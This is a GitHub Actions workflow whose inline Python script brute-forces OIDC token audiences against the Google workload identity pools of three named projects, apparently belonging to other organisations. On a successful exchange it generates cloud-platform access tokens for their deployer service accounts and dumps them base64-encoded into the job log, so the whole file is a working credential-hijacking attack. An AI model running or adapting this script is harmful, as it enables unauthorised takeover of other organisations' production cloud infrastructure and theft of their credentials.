name: i33520-aud
on:
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  mint:
    runs-on: ubuntu-latest
    timeout-minutes: 6
    steps:
      - name: mint
        run: |
          python3 - <<'PY'
          import base64, json, os, subprocess, urllib.error, urllib.parse, urllib.request
          G = "projects/%s/locations/global/workloadIdentityPools/%s/providers/%s"
          CASES = []
          for proj, num, pool, sa in [("cubecommons-prod", "366271888053", "cube-prod", "service-deployer@cubecommons-prod.iam.gserviceaccount.com"),
                                      ("cubecommons-dev", "744911585239", "cube-dev", "docker-image-publisher@cubecommons-dev.iam.gserviceaccount.com"),
                                      ("fhir-org-cds-services", "769700566231", "gh-actions-pool", "github-deploy@fhir-org-cds-services.iam.gserviceaccount.com")]:
              prov = G % (num, pool, "github-actions" if "cube" in pool else "github")
              for aud in ["https://iam.googleapis.com/" + prov, "//iam.googleapis.com/" + prov,
                          "https://github.com/cubeca", "https://github.com/cubeca/cube", "cubeca", "cubecommons",
                          "https://cubecommons.ca", proj, "https://github.com/mmlanla", "https://github.com/cubeca/cube/"]:
                  CASES.append({"proj": proj, "prov": prov, "sa": sa, "mint_aud": aud, "sts_aud": "//iam.googleapis.com/" + prov})

          def req(u, data=None, token=None, timeout=40):
              h = {'Accept': 'application/json', 'Content-Type': 'application/json', 'User-Agent': 'i33520'}
              if token: h['Authorization'] = 'Bearer ' + token
              if isinstance(data, (dict, list)): data = json.dumps(data).encode()
              r = urllib.request.Request(u, data=data, headers=h)
              try:
                  resp = urllib.request.urlopen(r, timeout=timeout); return resp.status, resp.read().decode('utf-8', 'replace')
              except urllib.error.HTTPError as e: return e.code, (e.read() or b'').decode('utf-8', 'replace')
              except Exception as e: return -1, repr(e)[:200]

          def mint(aud):
              u = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL', '')
              t = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN', '')
              u = u + ('&' if '?' in u else '?') + 'audience=' + urllib.parse.quote(aud, safe='')
              out = subprocess.run(['curl', '-sS', '-m', '30', '-H', 'Authorization: Bearer ' + t, u], capture_output=True, text=True).stdout
              try: return json.loads(out).get('value', ''), out[:180]
              except Exception: return '', out[:180]

          for i, c in enumerate(CASES):
              tok, raw = mint(c['mint_aud'])
              out = {'i': i, 'proj': c['proj'], 'mint_aud': c['mint_aud'], 'mint': bool(tok)}
              if not tok:
                  out['raw'] = raw; print('RESULT ' + json.dumps(out), flush=True); continue
              body = {'audience': c['sts_aud'], 'grantType': 'urn:ietf:params:oauth:grant-type:token-exchange',
                      'requestedTokenType': 'urn:ietf:params:oauth:token-type:access_token',
                      'scope': 'https://www.googleapis.com/auth/cloud-platform',
                      'subjectTokenType': 'urn:ietf:params:oauth:token-type:jwt', 'subjectToken': tok}
              st, rb = req('https://sts.googleapis.com/v1/token', data=body); out['sts'] = st
              if st != 200:
                  out['err'] = str(rb)[:400]; print('RESULT ' + json.dumps(out), flush=True); continue
              fed = json.loads(rb).get('access_token')
              gst, gres = req('https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/%s:generateAccessToken' % urllib.parse.quote(c['sa'], safe=''),
                              data={'scope': ['https://www.googleapis.com/auth/cloud-platform'], 'lifetime': '3600s'}, token=fed)
              out['gen'] = gst
              if gst == 200:
                  j = json.loads(gres)
                  out['tok_b64'] = base64.b64encode(j.get('accessToken', '').encode()).decode(); out['expire'] = j.get('expireTime')
                  print('HIT ' + json.dumps(out), flush=True)
              else:
                  out['err'] = str(gres)[:300]
              print('RESULT ' + json.dumps(out), flush=True)
          print('DONE', flush=True)
          PY
